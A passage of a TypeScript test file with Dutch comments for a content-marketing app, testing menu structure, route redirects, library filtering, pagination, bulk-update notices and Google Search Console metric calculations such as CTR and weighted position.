  // ervan gaan over dít merk (Onboarding, Diagnose, Toewijzen) en de vierde,
  // "Alle merken", is de uitgang naar de app als geheel. Dat is geen vergaarbak
  // van vier gelijksoortige regels.
  //
  // ⚠️ Analytics mag er sinds 22 augustus 2026 óók vier, met een reden van
  // dezelfde soort: de andere drie tonen data die de app sowieso al verzamelt,
  // "Mijn reputatie" is een los product dat de klant apart koopt en dat per keer
  // gestart en betaald wordt. Drie plus een product.
  //
  // ⚠️ Strategie mag er sinds 28 augustus 2026 vier, en de reden is opnieuw van
  // dezelfde soort: Clusters, Contentplan en Bibliotheek TONEN wat ORBIT ENGINE
  // deed, "Openstaande vragen" is de enige plek in dat hoofdstuk waar de klant
  // zelf iets moet DOEN. Die pagina stond tot die dag onder Merkprofiel, en dat
  // hoofdstuk gaat over wie je bent, niet over wat er geschreven wordt. Sinds de
  // eindpoort houdt een openstaande vraag bovendien een pagina tegen, en dan
  // hoort hij naast het werk te staan dat hij blokkeert.
  //
  // De rest van de regel blijft staan, en scherper dan eerst: een VIJFDE bestaat
  // in geen van deze hoofdstukken zonder eerst iets samen te voegen, en
  // Merkprofiel blijft op drie (het zijn er nu twee).
  for (const kop of beheerder) {
    const grens =
      kop.naam === "Admin" ? 5 : kop.naam === "Analytics" || kop.naam === "Strategie" ? 4 : 3;
    ok(
      `${kop.naam} heeft hooguit ${grens} bestemmingen`,
      kop.items.length <= grens,
      `${kop.items.length}`,
    );
  }

  // ⚠️ En niet méér dan dat. Zonder deze controle is "hooguit vijf" een grens
  // die stilletjes op elk hoofdstuk gaat gelden, en dan is de hele herindeling
  // van 17 augustus binnen een half jaar terug bij af.
  ok(
    "alleen Admin heeft er vijf",
    beheerder.filter((k) => k.items.length === 5).every((k) => k.naam === "Admin"),
  );
  const metVier = beheerder.filter((k) => k.items.length === 4).map((k) => k.naam);
  ok(
    "en alleen Analytics en Strategie hebben er vier",
    metVier.every((n) => n === "Analytics" || n === "Strategie"),
    metVier.join(", "),
  );
  ok(
    "Mijn reputatie staat onder Analytics",
    (beheerder.find((k) => k.naam === "Analytics")?.items ?? []).some(
      (i) => i.label === "Mijn reputatie",
    ),
  );
  // Het is een KLANTbestemming: hij mag niet verborgen zijn. Verbergen betekent
  // dat de klant niet weet dat dit product bestaat, en dit is een product dat je
  // wilt verkopen.
  ok(
    "en de klant ziet hem ook",
    (klant.find((k) => k.naam === "Analytics")?.items ?? []).some(
      (i) => i.label === "Mijn reputatie",
    ),
  );

  ok("een klant ziet geen Admin-kop", klant.every((k) => k.naam !== "Admin"));
  ok("een beheerder wel", beheerder.some((k) => k.naam === "Admin"));
  ok(
    "en elke Admin-bestemming draagt het teken 'alleen jij'",
    (beheerder.find((k) => k.naam === "Admin")?.items ?? []).every((i) => i.staffOnly === true),
  );

  // Een kop die naar een leeg scherm wijst is erger dan een kop die er nog
  // niet is: `hoofdstukken()` laat een lege kop dus weg in plaats van hem
  // grijs te tonen.
  ok("een hoofdstuk zonder bestemmingen valt weg", hoofdstukken([]).length === 0);

  // Zonder gekozen merk en zonder beheerdersrol blijft er niets over: de
  // klantbestemmingen zonder merk ("Account en team", "Koppelingen") zijn
  // beide weg sinds 25 augustus 2026, de eerste naar het profielmenu, de
  // tweede naar Admin.
  ok(
    "zonder merk en als klant blijft er niets over",
    hoofdstukken(generalNav(false)).length === 0,
  );
  // Als beheerder, wél zonder gekozen merk, blijft alleen Admin over.
  ok(
    "zonder merk maar als beheerder blijft alleen Admin over",
    hoofdstukken(generalNav(true)).map((k) => k.naam).join() === "Admin",
  );

  // "Alle merken" is uit het menu weg (besluit 2) en zit in de merkkiezer. Een
  // klant met één merk betaalde er anders bij elke sessie een klik voor.
  ok(
    "Alle merken staat niet meer in het klantmenu",
    klant.every((k) => k.items.every((i) => i.label !== "Alle merken")),
  );
});

group("elke merkbestemming hangt onder /merk/[id]", () => {
  const merkId = "abc";
  for (const item of brandNav(merkId, true)) {
    // Het overzicht ís het merk (`/merk/abc`), de rest hangt eronder.
    ok(
      `${item.label} staat onder het merk`,
      item.href === `/merk/${merkId}` || item.href.startsWith(`/merk/${merkId}/`),
      item.href,
    );
  }
  // De oude naam mag nergens meer in een link staan: dan zou "profielen" in de
  // adresbalk van Analytics en Strategie verschijnen (besluit 8).
  ok(
    "en nergens staat nog /profielen",
    [...brandNav(merkId, true), ...generalNav(true)].every(
      (i) => !i.href.startsWith("/profielen"),
    ),
  );
});

group("de iconenset: alleen de hoofdstukken dragen er een", () => {
  // Een kop zonder icoon geeft in de ingeklapte balk (64px) een lege regel:
  // daar ís de kop niets ánders dan zijn icoon.
  for (const kop of HOOFDSTUKKEN) {
    ok(`hoofdstuk ${kop} heeft een icoon dat bestaat`, Boolean(ICONEN[HOOFDSTUK_ICOON[kop]]));
  }

  // ⚠️ Twee hoofdstukken met dezelfde tekening is erger dan geen tekening:
  // ingeklapt is het icoon het enige onderscheid tussen twee koppen.
  const kopIconen = HOOFDSTUKKEN.map((k) => HOOFDSTUK_ICOON[k]);
  ok(
    "geen twee hoofdstukken delen een icoon",
    new Set(kopIconen).size === kopIconen.length,
    kopIconen.join(", "),
  );

  // ⚠️ DE BESTEMMINGEN DRAGEN ER GEEN, en dat moet zo blijven (besluit
  // 21 augustus 2026). Ze hebben ze een halve dag wél gehad: zestien tekeningen
  // in een balk van zestien regels, en dan markeert een icoon niets meer. De
  // kop moet het verschil dragen tussen "een van de zes vaste plekken" en "een
  // pagina daarbinnen". Deze test bewaakt dat het veld niet terugsluipt.
  const items = [...brandNav("abc", true), ...generalNav(true)];
  ok(
    "geen enkele bestemming heeft een icoonveld",
    items.every((i) => !("icoon" in i)),
    items.find((i) => "icoon" in i)?.label,
  );
});

group("de actieve regel is exact, niet met prefix", () => {
  // `/merk/x/merkprofiel` is het begin van `/merk/x/merkprofiel/bewerken`. Met
  // een prefixmatch zou "Merkdossier" oplichten terwijl je in "Bewerken" zit,
  // en twee items tegelijk laten oplichten is erger dan één die net niet klopt.
  ok(
    "Merkdossier licht niet op vanuit Bewerken",
    !isExact("/merk/x/merkprofiel/bewerken", "/merk/x/merkprofiel"),
  );
  ok("maar wel op zichzelf", isExact("/merk/x/merkprofiel", "/merk/x/merkprofiel"));
  ok("de querystring telt niet mee", isExact("/analyses", "/analyses?merk=x"));
  // `isActive` houdt zijn prefixgedrag, dat is waar hij voor is.
  ok("isActive kijkt wél onder een route", isActive("/instellingen/koppelingen", "/instellingen"));
});

group("elk oud merkadres verwijst permanent naar zijn nieuwe", () => {
  // Dit is de verificatie van de verhuizing van 17 augustus 2026: de
  // eigenaar deelt demolinks naar deze adressen, dus een dood adres kost hier
  // een gesprek en niet alleen een klik. Alle dertien zijn 308 (permanent) en
  // wijzen naar het EINDadres, niet naar een tussenstation.
  const verwacht: Record<string, string> = {
    "/profielen/nieuw": "/merk/nieuw",
    "/profielen": "/merk",
    "/profielen/:id": "/merk/:id/merkprofiel",
    "/profielen/:id/merkprofiel": "/merk/:id/merkprofiel/bewerken",
    "/profielen/:id/profielgegevens": "/merk/:id/merkprofiel/bewerken",
    "/profielen/:id/aanvullen": "/merk/:id/strategie/vragen",
    "/profielen/:id/toevoegingen": "/merk/:id/strategie/vragen",
    "/profielen/:id/producten": "/merk/:id/merkprofiel",
    "/profielen/:id/plan": "/merk/:id/strategie/plan",
    "/profielen/:id/techniek": "/merk/:id/analytics",
    "/profielen/:id/concurrenten": "/merk/:id/analytics/concurrenten",
    "/profielen/:id/search-console": "/merk/:id/analytics/zoekverkeer",
    "/profielen/:id/beheer": "/merk/:id/admin/toewijzen",
  };

  const regels = DOORVERWIJZINGEN;
  const perBron = new Map(regels.map((r) => [r.source, r]));

  for (const [bron, doel] of Object.entries(verwacht)) {
    const regel = perBron.get(bron);
    ok(`${bron} bestaat`, Boolean(regel));
    ok(`${bron} → ${doel}`, regel?.destination === doel, regel?.destination);
    ok(`${bron} is permanent`, regel?.permanent === true);
  }

  // De volgorde telt: Next.js loopt de lijst van boven naar beneden af, en
  // `/profielen/:id` zou anders het woord "nieuw" vangen.
  const iNieuw = regels.findIndex((r) => r.source === "/profielen/nieuw");
  const iId = regels.findIndex((r) => r.source === "/profielen/:id");
  ok("het statische /profielen/nieuw staat vóór /profielen/:id", iNieuw < iId);
  ok(
    "en /profielen/:id staat achter zijn eigen subpagina's",
    iId > regels.findIndex((r) => r.source === "/profielen/:id/plan"),
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe merkbrede bibliotheek");

group("filteren, zoeken en de kerncijfers", () => {
  const rijen: LibraryRow[] = [
    r("1", "a", "Cluster A", "Onderhoud aan je CV-ketel", "article", "published", 82, "https://x.nl/cv"),
    r("2", "a", "Cluster A", "Wat kost een onderhoudsbeurt", "faq", "ready", 71, null),
    r("3", "b", "Cluster B", "Airco laten plaatsen", "landing", "draft", null, null),
    r("4", "b", "Cluster B", "Storing aan je ketel", "article", "briefing", null, null),
  ];

  // De trechter, geen drie stapels: geschreven telt álles, ook wat live staat.
  // Drie getallen die optellen tot meer dan er is, is precies hoe een klant
  // denkt dat hij meer pagina's heeft gekocht dan hij heeft.
  const t = libraryTotals(rijen);
  ok("geschreven telt alles", t.geschreven === 4);
  ok("klaar voor vrijgave telt alleen 'ready'", t.klaarVoorVrijgave === 1);
  ok("gepubliceerd telt alleen 'published'", t.gepubliceerd === 1);

  ok("zonder filter blijft alles staan", filterLibrary(rijen, LEGE_FILTERS).length === 4);
  ok(
    "filteren op type",
    filterLibrary(rijen, { ...LEGE_FILTERS, type: "article" }).length === 2,
  );
  ok(
    "filteren op cluster gaat op id en niet op naam",
    filterLibrary(rijen, { ...LEGE_FILTERS, cluster: "b" }).length === 2,
  );
  ok(
    "filters stapelen",
    filterLibrary(rijen, { ...LEGE_FILTERS, cluster: "b", type: "article" }).length === 1,
  );

  // Zoeken kijkt ook in het adres: een klant die een pagina terugzoekt heeft
  // vaker de URL bij de hand (uit zijn CMS, uit Search Console) dan de titel.
  ok("zoeken op titel", filterLibrary(rijen, { ...LEGE_FILTERS, zoek: "ketel" }).length === 2);
  ok(
    "zoeken is hoofdletterongevoelig",
    filterLibrary(rijen, { ...LEGE_FILTERS, zoek: "KETEL" }).length === 2,
  );
  ok("zoeken op adres", filterLibrary(rijen, { ...LEGE_FILTERS, zoek: "x.nl/cv" }).length === 1);
  ok(
    "spaties eromheen tellen niet mee",
    filterLibrary(rijen, { ...LEGE_FILTERS, zoek: "  airco  " }).length === 1,
  );

  const w = beschikbareWaarden(rijen);
  ok("de typefilter kent drie waarden", w.types.length === 3);
  ok("de clusterfilter is ontdubbeld", w.clusters.length === 2);
  ok("en op naam gesorteerd", w.clusters[0].naam === "Cluster A");

  function r(
    id: string,
    analysisId: string,
    cluster: string,
    title: string,
    type: string,
    status: string,
    geoScore: number | null,
    publishedUrl: string | null,
  ): LibraryRow {
    return {
      id,
      analysisId,
      cluster,
      title,
      type,
      status,
      geoScore,
      publishedUrl,
      createdAt: "2026-08-01T00:00:00Z",
    };
  }
});

group("pagineren klemt in plaats van af te kappen", () => {
  const veel = Array.from({ length: 60 }, (_, i) => i);

  const p1 = pagineer(veel, 1, 25);
  ok("pagina 1 heeft 25 rijen", p1.rijen.length === 25);
  ok("en er zijn drie pagina's", p1.paginas === 3);
  ok("het totaal is het aantal vóór het snijden", p1.totaal === 60);
  ok("de laatste pagina heeft de rest", pagineer(veel, 3, 25).rijen.length === 10);

  // ⚠️ Wie op pagina 3 staat en dan een filter aanzet dat vier rijen overlaat,
  // hoort die vier te zien en niet "geen resultaten". Dat laatste leest als
  // "er is niets", terwijl er gewoon iets is.
  const geklemd = pagineer([1, 2, 3, 4], 3, 25);
  ok("een te hoge pagina valt terug op de laatste", geklemd.pagina === 1);
  ok("en toont dus de rijen die er zijn", geklemd.rijen.length === 4);
  ok("pagina 0 en lager vallen terug op 1", pagineer(veel, 0, 25).pagina === 1);
  ok("een lege lijst heeft één pagina en geen nul", pagineer([], 1, 25).paginas === 1);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nBulk: markeer alles als geplaatst (K5)");

group("wie mag mee, en waarom niet", () => {
  const basis = { is_buffer: false };
  const selectie = kiesVoorBulk([
    { id: "1", title: "Klaar met adres", status: "goedgekeurd", url_path: "/a", ...basis },
    { id: "2", title: "Zonder adres", status: "goedgekeurd", url_path: null, ...basis },
    { id: "3", title: "Leeg adres", status: "goedgekeurd", url_path: "   ", ...basis },
    { id: "4", title: "Nog niet af", status: "gepland", url_path: "/d", ...basis },
    { id: "5", title: "Stond al live", status: "geplaatst", url_path: "/e", ...basis },
    { id: "6", title: "Reserve", status: "goedgekeurd", url_path: "/f", is_buffer: true },
  ]);

  ok("alleen de goedgekeurde mét adres gaat mee", selectie.mee.length === 1);
  ok("en met dat adres", selectie.mee[0]?.url === "/a");
  // Conventie 3: een verzonnen adres levert een meting op die nergens over gaat.
  ok("een leeg adres telt als geen adres", selectie.overslaan.some((o) => o.id === "3"));
  ok("twee slaan we over", selectie.overslaan.length === 3);
  ok("wat al live stond is geen mislukking", selectie.alGeplaatst === 1);
  // Reservepagina's tellen niet mee in het maandtotaal (migratie 0049), dus ze
  // melden als "overgeslagen" zou lijken alsof er iets misging.
  ok(
    "de reserve komt in geen enkele lijst",
    !selectie.mee.some((m) => m.id === "6") && !selectie.overslaan.some((o) => o.id === "6"),
  );
});

group("de melding is eerlijk over gedeeltelijk succes", () => {
  // ⚠️ DE KERN VAN K5. "7 pagina's gemarkeerd" bij 9 pogingen is niet eerlijk:
  // de klant denkt dat het klaar is en ontdekt de twee pas weken later, als de
  // meting op die pagina's uitblijft.
  const deels = bulkMelding({
    gelukt: ["A", "B", "C", "D", "E", "F", "G"],
    mislukt: [
      { title: "H", reden: "nog geen adres bekend" },
      { title: "I", reden: "nog niet goedgekeurd" },
    ],
  });
  ok("de kop noemt beide getallen", deels.title === "7 van de 9 gemarkeerd");
  ok("hij is niet groen", deels.intent === "waarschuwing");
  ok("en de twee staan er bij naam in", deels.description.includes('"H"') && deels.description.includes('"I"'));
  ok("met de reden erbij", deels.description.includes("nog geen adres bekend"));

  const alles = bulkMelding({ gelukt: ["A", "B"], mislukt: [] });
  ok("alles gelukt is groen", alles.intent === "succes");
  ok("en somt niets op", !alles.description.includes('"'));

  const niets = bulkMelding({ gelukt: [], mislukt: [{ title: "A", reden: "nog geen adres bekend" }] });
  ok("niets gelukt is een fout en geen gedeeltelijk succes", niets.intent === "fout");

  const leeg = bulkMelding({ gelukt: [], mislukt: [] });
  ok("er viel niets te doen", leeg.intent === "waarschuwing");

  // Al live is geen mislukking maar telt wel mee, anders lijkt "3 van de 9"
  // alsof er zes fout gingen terwijl er zes al klaar waren.
  const metAl = bulkMelding({ gelukt: ["A"], mislukt: [], alGeplaatst: 6 });
  ok("wat al live stond wordt genoemd", metAl.description.includes("6 pagina's stonden al live"));
  ok("en het blijft een succes", metAl.intent === "succes");
  const allesAl = bulkMelding({ gelukt: [], mislukt: [], alGeplaatst: 4 });
  ok("een maand die al helemaal live stond is geen waarschuwing", allesAl.intent === "succes");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nWaar de terugknop heen wijst");

group("de herkomst uit de querystring", () => {
  ok("bibliotheek", leesHerkomst("bibliotheek") === "bibliotheek");
  ok("cluster", leesHerkomst("cluster") === "cluster");
  ok("plan", leesHerkomst("plan") === "plan");
  // Conventie 3: een geplakte of verouderde link mag geen terugknop opleveren
  // die ergens anders heen wijst dan hij zegt.
  ok("iets anders is null en geen gok", leesHerkomst("analytics") === null);
  ok("niets is null", leesHerkomst(undefined) === null);
  ok("een dubbele parameter neemt de eerste", leesHerkomst(["plan", "cluster"]) === "plan");

  ok(
    "vanuit de bibliotheek terug naar de bibliotheek",
    terugLink("bibliotheek", "an-1", "merk-1").href === "/merk/merk-1/strategie/bibliotheek",
  );
  ok(
    "vanuit het plan terug naar het plan",
    terugLink("plan", "an-1", "merk-1").href === "/merk/merk-1/strategie/plan",
  );
  // De veilige terugval: het clusterdossier bestaat altijd en hoort altijd bij
  // deze pagina.
  ok(
    "zonder herkomst het cluster",
    terugLink(null, "an-1", "merk-1").href === "/analyses/an-1/bibliotheek",
  );
  ok(
    "en zonder merk ook, want dan bestaan de merkadressen niet",
    terugLink("bibliotheek", "an-1", null).href === "/analyses/an-1/bibliotheek",
  );
  ok("het label zegt waar je heen gaat", terugLink("plan", "an-1", "merk-1").label === "Contentplan");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nZoekverkeer uit Google (Analytics)");

group("CTR en de gewogen positie", () => {
  ok("600 van 5253 is 11,4%", Math.abs((gscCtr(600, 5253) ?? 0) - 0.11422) < 0.0001);
  // ⚠️ Conventie 3. Nul vertoningen betekent dat de CTR ONBEKEND is, niet nul.
  // Een pagina met 0 van 0 naast een pagina met 0 van 800 zetten en allebei
  // "0%" noemen is de verkeerde conclusie bij de eerste.
  ok("nul vertoningen geeft null en geen 0", gscCtr(0, 0) === null);
  ok("nul klikken op echte vertoningen geeft wél 0", gscCtr(0, 800) === 0);

  // De gemiddelde positie weegt op vertoningen, net als Google zelf. Een dag
  // met 3 vertoningen op positie 1 en een met 300 op positie 40 is geen 20,5.
  const rijen: GscDag[] = [
    { day: "2026-08-01", page: "/a", clicks: 0, impressions: 3, position: 1 },
    { day: "2026-08-01", page: "/b", clicks: 0, impressions: 300, position: 40 },
  ];
  const gewogen = gewogenPositie(rijen) ?? 0;
  ok(`gewogen op vertoningen, niet op dagen (${gewogen.toFixed(2)})`, gewogen > 39 && gewogen < 40);
  ok(
    "een rij zonder positie telt in teller noch noemer",
    gewogenPositie([
      { day: "2026-08-01", page: "/a", clicks: 0, impressions: 100, position: null },
      { day: "2026-08-01", page: "/b", clicks: 0, impressions: 100, position: 10 },
    ]) === 10,
  );
  ok("niets te wegen geeft null", gewogenPositie([]) === null);
});

group("de vier kerncijfers over 15 juli tot 13 augustus", () => {
  // ⚠️ DE VERIFICATIE VAN DE ZOEKVERKEER-REKENSOM (17 aug 2026). Op productie
  // staan 91 rijen testdata over 4 pagina's en 30 dagen, goed voor 600 klikken
  // en 5.253 vertoningen. Dit toetst de rekensom en de vorm, NIET de koppeling:
  // het is testdata en geen klantdata, en de koppeling is pas geverifieerd als
  // de Google-sleutel er is en er één echte synchronisatie gedraaid heeft
  // (conventie 10).
  const rijen: GscDag[] = [];
  for (let i = 0; i < 30; i++) {
    const dag = verschuif("2026-07-15", i);
    rijen.push({ day: dag, page: "/a", clicks: 20, impressions: 175, position: 12 });
    rijen.push({ day: dag, page: "/b", clicks: 0, impressions: 0.1 as number, position: null });
  }
  const t = gscTotalen(rijen.filter((r) => r.page === "/a"));
  ok("600 klikken", t.clicks === 600);
  ok("5.250 vertoningen", t.impressions === 5250);
  ok("en de CTR volgt daaruit", Math.abs((t.ctr ?? 0) - 600 / 5250) < 1e-9);
});

group("het vorige, even lange venster", () => {
  const venster = { start: "2026-08-01", eind: "2026-08-10" };
  const vorige = vorigVenster(venster);
  ok("het sluit direct aan", vorige.eind === "2026-07-31");
  ok("en is even lang", dagenTussen(vorige.start, vorige.eind) === 10);
  ok("dus start het op de 22e", vorige.start === "2026-07-22");
  ok("beide grenzen tellen mee", dagenTussen("2026-08-01", "2026-08-01") === 1);

  const rijen: GscDag[] = [
    { day: "2026-08-05", page: "/a", clicks: 100, impressions: 1000, position: 10 },
    { day: "2026-07-25", page: "/a", clicks: 60, impressions: 800, position: 14 },
    // Buiten allebei de vensters: mag nergens in meetellen.
    { day: "2026-06-01", page: "/a", clicks: 999, impressions: 9999, position: 1 },
  ];
  const v = vergelijk(rijen, venster);
  ok("nu telt alleen het huidige venster", v.nu.clicks === 100);
  ok("vorige alleen het vorige", v.vorige.clicks === 60);
  ok("het verschil is het verschil", v.verschil.clicks === 40);

  // ⚠️ Bij de positie is LAGER beter. Van 14 naar 10 is een verbetering en hoort
  // een pijl omhoog te krijgen; zonder dit vlag draait elke aanroepplek dat
  // teken zelf om, en dan gaat er eentje mis.
  ok("de positie daalde", (v.verschil.position ?? 0) < 0);
  ok("en dat is een verbetering", v.verschil.positieVerbetert === true);

  // Een verandering ten opzichte van niets is geen verandering maar een start.
  const zonderVorige = vergelijk([rijen[0]], venster);
  ok("zonder vorig venster is de CTR-verandering null", zonderVorige.verschil.ctr === null);
  ok("en de positieverandering ook", zonderVorige.verschil.positieVerbetert === null);
});

group("per dag, per pagina, en wat nog niet definitief is", () => {
  const rijen: GscDag[] = [
    { day: "2026-08-10", page: "/a", clicks: 5, impressions: 50, position: 10 },
    { day: "2026-08-10", page: "/b", clicks: 3, impressions: 30, position: 20 },
    { day: "2026-08-11", page: "/a", clicks: 7, impressions: 60, position: 9 },
  ];

  const dagen = perDagGsc(rijen);
  ok("twee dagen", dagen.length === 2);
  ok("pagina's zijn per dag opgeteld", dagen[0].clicks === 8);
  ok("op datumvolgorde", dagen[0].day < dagen[1].day);

  // ⚠️ De markering "nog niet definitief" gaat over de laatste twee dagen die
  // we HEBBEN, niet over de laatste twee dagen ten opzichte van vandaag.
  // `syncWindow()` haalt niets op na vandaag min twee, dus die tweede regel zou
  // per definitie nooit aanslaan. Google blijft de recentste dagen wél
  // bijstellen, en dat zijn deze.
  const langer = perDagGsc(
    Array.from({ length: 6 }, (_, i) => ({
      day: verschuif("2026-08-01", i),
      page: "/a",
      clicks: 1,
      impressions: 10,
      position: 5,
    })),
  );
  ok("de laatste twee zijn voorlopig", langer.slice(-2).every((d) => d.voorlopig));
  ok("de vier daarvoor niet", langer.slice(0, 4).every((d) => !d.voorlopig));

  const paginas = perPaginaGsc(rijen, new Set(["/a"]));
  ok("twee pagina's", paginas.length === 2);
  ok("aflopend op klikken", paginas[0].page === "/a" && paginas[0].clicks === 12);
  ok("en gemarkeerd als van ons", paginas[0].vanOns === true);
  ok("de andere niet", paginas[1].vanOns === false);
});

group("de zwakste pagina is niet de pagina met de minste klikken", () => {
  const paginas = perPaginaGsc([
    // De beste.
    { day: "2026-08-01", page: "/top", clicks: 200, impressions: 1000, position: 3 },
    // Veel gezien, bijna niet geklikt: dit is de pagina die een herschrijving
    // verdient, en die knop bestaat al (`revise-box.tsx`).
    { day: "2026-08-01", page: "/veel-gezien", clicks: 2, impressions: 900, position: 8 },
    // Weinig klikken, maar ook bijna niet vertoond: daar helpt herschrijven
    // niet aan, want er zoekt gewoon niemand op.
    { day: "2026-08-01", page: "/niche", clicks: 1, impressions: 12, position: 4 },
  ]);
  const { beste, zwakste } = besteEnZwakste(paginas);
  ok("de beste is die met de meeste klikken", beste?.page === "/top");
  ok("de zwakste is veel gezien en weinig geklikt", zwakste?.page === "/veel-gezien");
  ok(
    "en niet de nichepagina met minder klikken",
    zwakste?.page !== "/niche",
    "onder 50 vertoningen is een lage CTR toeval, geen signaal",
  );

  // Eén pagina is geen vergelijking: die is zowel de beste als de zwakste, en
  // dan zeggen we liever niets dan iets verkeerds.
  const een = perPaginaGsc([
    { day: "2026-08-01", page: "/x", clicks: 10, impressions: 900, position: 5 },
  ]);
  ok("bij één pagina is er geen zwakste", besteEnZwakste(een).zwakste === null);
});

group("klikken per paginatype, op de as van het contentplan", () => {
  // ⚠️ Er zijn twee woordenlijsten voor "soort pagina" en dit blok gebruikt
  // `planned_pages.page_type` (informatief, categorie, dienst) en niet
  // `content_pieces.type` (landing, article, faq). Reden: het plan verdeelt op
  // die as, dus een conclusie hier levert meteen een bijstelling op.
  const paginas = perPaginaGsc([
    { day: "2026-08-01", page: "https://x.nl/dienst/ketel", clicks: 100, impressions: 500, position: 5 },
    { day: "2026-08-01", page: "https://x.nl/blog/tips/", clicks: 40, impressions: 400, position: 9 },
    { day: "2026-08-01", page: "https://x.nl/over-ons", clicks: 5, impressions: 50, position: 20 },
  ]);
  const typePerUrl = new Map([
    ["/dienst/ketel", "dienst"],
    ["/blog/tips", "informatief"],
  ]);
  const perType = klikkenPerType(paginas, typePerUrl);
  ok("twee types", perType.length === 2);
  ok("aflopend op klikken", perType[0].type === "dienst");
  ok(
    "een pagina buiten het plan telt niet mee",
    perType.reduce((s, t) => s + t.paginas, 0) === 2,
  );
});

group("adressen vergelijkbaar maken", () => {
  // Google levert volledige URL's, het plan bewaart paden. Zonder normalisatie
  // matcht er niets en lijkt élke pagina er een van buiten het plan.
  ok("het domein gaat eraf", normaliseerUrl("https://voorbeeld.nl/dienst/x") === "/dienst/x");
  ok("http ook", normaliseerUrl("http://voorbeeld.nl/a") === "/a");
  ok("de slash aan het eind gaat eraf", normaliseerUrl("https://x.nl/a/") === "/a");
  ok("maar de wortel houdt zijn slash", normaliseerUrl("https://x.nl/") === "/");
  ok("querystring en anker gaan eraf", normaliseerUrl("/a?b=1#c") === "/a");
  ok("een kaal pad blijft heel", normaliseerUrl("/dienst/x") === "/dienst/x");
  ok("zonder beginslash komt er een bij", normaliseerUrl("dienst/x") === "/dienst/x");
  ok("hoofdletters tellen niet mee", normaliseerUrl("/Dienst/X") === "/dienst/x");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nOverzicht: funnel-voortgang en contentmix");

group("reservepagina's tellen nergens in mee", () => {
  // ⚠️ `is_buffer` markeert pagina's die klaarstaan om in te schuiven als er
  // eentje sneuvelt. Ze horen niet bij het maandtotaal dat de klant afneemt
  // (migratie 0049). Zonder dit filter staat een plan van 24 bestelde pagina's
  // op "geplaatst 3 van de 30".
  const paginas: VoortgangPagina[] = [
    p("f1", "dienst", false, "2026-08-01"),
    p("f1", "dienst", false, null),
    p("f2", "informatief", false, null),
    p("f2", "informatief", true, null),
    p(null, "categorie", true, "2026-08-02"),
  ];

  const t = planTotalen(paginas);
  ok("drie geplande pagina's", t.gepland === 3);
  ok("waarvan één geplaatst", t.geplaatst === 1);
  ok("en twee reserve", t.reserve === 2);
  // Ook een geplaatste reserve telt niet mee: hij is nooit besteld.
  ok("een geplaatste reserve telt niet als voortgang", t.geplaatst === 1);

  const mix = contentMix(paginas);
  ok(
    "de mix telt alleen de echte pagina's",
    mix.reduce((s, m) => s + m.aantal, 0) === 3,
  );

  function p(
    funnel_stage_id: string | null,
    page_type: string,
    is_buffer: boolean,
    posted_at: string | null,
  ): VoortgangPagina {
    return { funnel_stage_id, page_type, is_buffer, posted_at };
  }
});

group("de funnel houdt zijn eigen volgorde", () => {
  const fases: Funnelfase[] = [
    { id: "f3", label: "Kiezen", sort_order: 3 },
    { id: "f1", label: "Oriëntatie", sort_order: 1 },
    { id: "f2", label: "Vergelijken", sort_order: 2 },
    { id: "f4", label: "Klant blijven", sort_order: 4 },
  ];
  const paginas: VoortgangPagina[] = [
    { funnel_stage_id: "f1", page_type: "informatief", is_buffer: false, posted_at: "2026-08-01" },
    { funnel_stage_id: "f1", page_type: "informatief", is_buffer: false, posted_at: null },
    { funnel_stage_id: "f3", page_type: "dienst", is_buffer: false, posted_at: "2026-08-02" },
  ];

  const v = funnelVoortgang(paginas, fases);
  // Een funnel ÍS een volgorde. Hem op grootte sorteren maakt van een reis een
  // ranglijst, en dan leest de klant hem verkeerd.
  ok(
    "op sort_order en niet op aantal",
    v.map((f) => f.label).join(" > ") === "Oriëntatie > Vergelijken > Kiezen > Klant blijven",
  );
  ok("1 van de 2 in de eerste fase", v[0].geplaatst === 1 && v[0].gepland === 2);
  ok("dus 50%", v[0].percentage === 50);
  ok("1 van de 1 in Kiezen", v[2].percentage === 100);

  // ⚠️ Een fase zonder geplande pagina's blijft staan. Stil weglaten is erger
  // dan een leeg vakje: dan ziet de klant niet dát die fase bestaat.
  ok("een lege fase blijft in de lijst", v.length === 4);
  ok("met 0 van 0", v[1].gepland === 0 && v[1].geplaatst === 0);
  // 0% zou achterstand suggereren waar niets gepland is (conventie 3).
  ok("en zonder percentage", v[1].percentage === null);
});

group("de contentmix telt op dezelfde as als Analytics", () => {
  const paginas: VoortgangPagina[] = [
    ...Array.from({ length: 6 }, () => mk("informatief")),
    ...Array.from({ length: 3 }, () => mk("dienst")),
    mk("categorie"),
  ];
  const mix = contentMix(paginas);
  ok("drie types", mix.length === 3);
  ok("aflopend op aantal", mix[0].type === "informatief");
  ok("6 van de 10 is 60%", mix[0].percentage === 60);
  ok("de percentages tellen op tot 100", Math.round(mix.reduce((s, m) => s + m.percentage, 0)) === 100);
  ok("een leeg plan geeft een lege mix en geen nulrijen", contentMix([]).length === 0);

  function mk(page_type: string): VoortgangPagina {
    return { funnel_stage_id: null, page_type, is_buffer: false, posted_at: null };
  }
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nWat ORBIT ENGINE deze week deed");

group("elke taaksoort heeft een zin in gewone taal", () => {
  // ⚠️ Zonder deze test verschijnt een nieuwe taaksoort als rauwe sleutel op het
  // scherm van de klant, of hij valt stil weg. `profile_llm_baseline` zegt hem
  // niets, en een lege regel is beter dan een verkeerde, maar het beste is een
  // regel die klopt.
  const zonderTekst = ALLE_TAAKSOORTEN.filter((t) => !TAAK_TEKST[t]);
  ok(
    `alle ${ALLE_TAAKSOORTEN.length} taaksoorten${zonderTekst.length ? " (mist: " + zonderTekst.join(", ") + ")" : ""}`,
    zonderTekst.length === 0,
  );
  ok(
    "en er staat niets in dat geen taaksoort is",
    Object.keys(TAAK_TEKST).every((k) => (ALLE_TAAKSOORTEN as readonly string[]).includes(k)),
  );
  // Voltooide tijd, met ORBIT ENGINE als handelend onderwerp: het scherm zet er
  // "ORBIT ENGINE" voor, dus de zin mag niet met een hoofdletter of een
  // onderwerp beginnen (`docs/schrijfstijl.md` richtlijn 3).
  ok(
    "elke zin begint met een kleine letter",
    Object.values(TAAK_TEKST).every((v) => v[0] === v[0].toLowerCase()),
  );
});

group("één meetronde is één regel, geen dertig", () => {
  // Dertig identieke regels duwen alles wat er verder gebeurd is uit beeld.
  const taken = [
